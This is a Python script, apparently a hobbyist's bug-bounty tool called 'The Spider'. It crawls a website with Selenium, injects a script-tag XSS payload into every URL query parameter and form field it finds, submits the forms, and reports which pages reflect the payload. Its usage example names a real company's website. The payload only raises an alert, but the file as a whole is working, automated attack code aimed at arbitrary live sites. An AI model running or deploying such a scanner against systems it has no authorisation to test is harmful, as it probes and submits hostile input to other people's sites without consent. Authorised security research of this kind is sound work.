#this script is for scanning a url, trying to inject the url with an innocent script (we love ethical hacking), includes looking for injection sites, using url injection and html form injection...
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import sys
import copy
from selenium import webdriver
import time

#presentation is fun
spiderArt = """
⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀
⡇⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀
⡇⠀⠀⠀⠀⠀⢨⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡃⠀⠀⠀⠀⠀⠘
⢰⠀⠀⠀⠀⠀⢰⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡆⠀⠀⠀⠀⠀⡇
⢸⡄⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⢠⠇
⠘⣧⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⠀
⠀⠹⣆⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⣰⠏⠀
⠀⠀⠹⣧⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⣰⠏⠀⠀
⠀⠀⠀⠹⣧⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠀⠀⢀⣾⠍⠀⠀⠀⠀⣴⠏⠀⠀⠀
⠀⠀⠀⠀⠙⡧⣀⠀⠀⠀⠘⣿⡄⠀⠀⠀⠀⢠⣾⠏⠀⠀⠀⣀⣼⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠻⣶⣤⡀⠘⢿⡄⣀⣀⢠⣿⠃⠀⣠⣴⡾⠛⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢷⣜⣿⣿⣿⣿⣣⣶⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣽⣿⣿⣿⣿⣯⣅⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣤⣴⠾⠿⠛⢋⣥⣿⣿⣿⣿⣿⣿⣍⠛⠻⠿⢶⣤⣄⡀⠀⠀⠀⠀
⠀⠀⠀⢰⡟⠉⠀⠀⠀⣠⡾⣻⢟⣥⣶⣿⣿⣿⡿⣷⣄⠀⠀⠈⠀⢿⡄⠀⠀⠀
⠀⠀⢠⡟⠀⠀⠀⣠⡾⠋⢰⣯⣾⣿⣿⣿⣿⣿⣿⡈⠻⣷⣄⠀⠀⠈⢷⡀⠀⠀
⠀⢀⡾⠁⠀⠀⣼⠋⠀⠀⢸⢸⣿⡿⠿⣿⠿⣿⣿⡇⠀⠈⢫⣧⠀⠀⠘⣷⠀⠀
⠀⣼⠃⠀⠀⢠⣿⠀⠀⠀⠸⣿⣿⣿⡆⠀⣼⡟⣹⠀⠀⠀⠀⣿⠀⠀⠀⠸⣧⠀
⠀⡟⠀⠀⠀⢸⡏⠀⠀⠀⠀⠙⢿⣯⣶⣶⣮⡿⠃⠀⠀⠀⠀⢹⡇⠀⠀⠀⣿⠀
⠀⡇⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠉⠛⠋⠉⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⢸⠀
⠀⡇⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⢸⠀
⠀⡇⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⢸⠀
⠀⡇⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⢸⠀
⠀⠁⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠈⠀
⠀⠀⠀⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠁⠀⠀⠀⠀⠀⠀⠀


"""


print(spiderArt)
print(" ===> The Spider <=== ")
print("This scans for open parameters and forms, and injects an XSS payload. ")

#configurations:
headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'X-HackerOne-Research': 'lstarry'
}

class XssProbe:
    def __init__(self, startUrl):
        self.startUrl = startUrl #parse url to understand its componeents
        self.domainName = urlparse(startUrl).netloc #use sets to track URLs and automatically handle duplicates
        self.urlsToCrawl = {startUrl}
        self.urlsCrawled = set()
        self.XSSPayload = "<script> alert('lstarry wuz here (from hackerone research)') </script>"
        print(f"[*] Spider probe initiated on {self.startUrl}")

    #crawling through the website to find links
    def crawl(self):
        print("[*] Starting up Selenium Window")
        try:
            driver = webdriver.Firefox()
        except Exception as e:
            print(f"[*] Failed to start webdriver. Error: {e}")
            return

        while self.urlsToCrawl:
            url = self.urlsToCrawl.pop()
            if url in self.urlsCrawled:
                continue

            print(f"[*] Spider crawling on {url}")

            try:
                driver.get(url)
                time.sleep(3)
                htmlAfterJs = driver.page_source
                self.urlsCrawled.add(url)

            except Exception as e:
                print(f"[!] Error craawling {url}: {e}")
                continue

            soup = BeautifulSoup(htmlAfterJs, 'html.parser')

            for link in soup.find_all('a', href = True):
                fullUrl = urljoin(self.startUrl, link['href'])
                if self.domainName in fullUrl and fullUrl not in self.urlsCrawled and fullUrl not in self.urlsToCrawl:
                    self.urlsToCrawl.add(fullUrl)
                
        driver.quit()
        print(f"[*] Crawler finished. Found {len(self.urlsCrawled)} unique pages.")

    #spider throwing our web into the house - looks at crawled Urls and finds forms and parameters
    def findInjectionPoints(self):
        print("\n[*] Identifying potential place for spider to enter...")
        vulnerableLinks = []
        for url in self.urlsCrawled:
            parsedUrl = urlparse(url)
            if parsedUrl.query:
                print(f"[!] Potential useable entrance (URL parameters): {url}")
                self.testUrlParameters(url)

    #spider launches itself into the parameters and sees if its reflected:
    def testUrlParameters(self, url):
        parsedUrl = urlparse(url)
        queryParameters = parse_qs(parsedUrl.query)

        #spider iterates through each key in the url
        for paramKey in queryParameters.keys():
            testParameters = copy.deepcopy(queryParameters) #deep copy to modify without affecting other tests :P
            print(f"[*] Testing parameter: '{paramKey}'")
            testParameters[paramKey] = [self.XSSPayload]

            testQuery = urlencode(testParameters, doseq = True)
            webbedUpUrl = parsedUrl._replace(query = testQuery).geturl()
            print(f"[*] Spider testing {webbedUpUrl}")

            try:
                response = requests.get(webbedUpUrl, headers = headers, timeout = 5)
                if self.XSSPayload in response.text:
                    print(f"\n[!] Vulnerability Detected")
                    print(f"[*] Payload was reflected...")
                    print(f"[*] Vulnerable URL: {webbedUpUrl}")

            except requests.exceptions.RequestException as e:
                print(f"[!] The spider can't throw it's web in there: {e}")
                continue

    #spider (armed with venom) goes to html forms and tries to inject them there
    def testForms(self):
        print("\n[*] Searching for HTML forms to test...")

        for url in self.urlsCrawled:
            try:
                response = requests.get(url, headers = headers, timeout = 5)
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                if forms:
                    print(f"[!] Found {len(forms)} form(s) on {url}")
            except requests.exceptions.RequestException:
                continue
            
            #testing each form found (spider HITS with venom)
            for form in forms:
                action = form.get('action')
                method = form.get('method', 'get').lower() #default to GET

                actionUrl = urljoin(url, action)

                #find input fields (the spider is like a nurse cleaning your arm before they put the syringe in)
                inputs = form.find_all(['input', 'textarea', 'select'])
                payloadData = {}
                for inputTag in inputs:
                    inputName = inputTag.get('name')
                    inputType = inputTag.get('type', 'text')

                    if inputName and inputType not in ['submit', 'button', 'checkbox', 'radio']:
                        payloadData[inputName] = self.XSSPayload

                if not payloadData:
                    continue

                print(f"[*] Spider testing injection site to {actionUrl}")

                try:
                    if method == 'post':
                        testResponse = requests.post(actionUrl, headers = headers, data = payloadData, timeout = 5)
                    else:
                        testResponse = requests.get(actionUrl, headers = headers, params = payloadData, timeout = 5)

                    if self.XSSPayload in testResponse.text:
                        print(f"[!] Vulnerability Detected! Payload reflected from form submission. Spider successfully injected (reflective) venom!")
                        print(f"[*] Target URL: {actionUrl}")
                        print(f"[*] Submitted Data: {payloadData}")

                except requests.exceptions.RequestException as e:
                    print(f"[!] Error Submitting form: {e}")

    def start(self):
        self.crawl()
        self.findInjectionPoints()
        self.testForms()
        print("\n[*] Spider is tired - (Probe complete).")

def main():
    if len(sys.argv) != 2:
        print("Example: python spider.py https:www.tesla.com")
        sys.exit(1)

    startUrl = sys.argv[1]

    if not startUrl.startswith('http'):
        startUrl = 'https://' + startUrl

    probe = XssProbe(startUrl)
    probe.start()

if __name__ == "__main__":
    main()





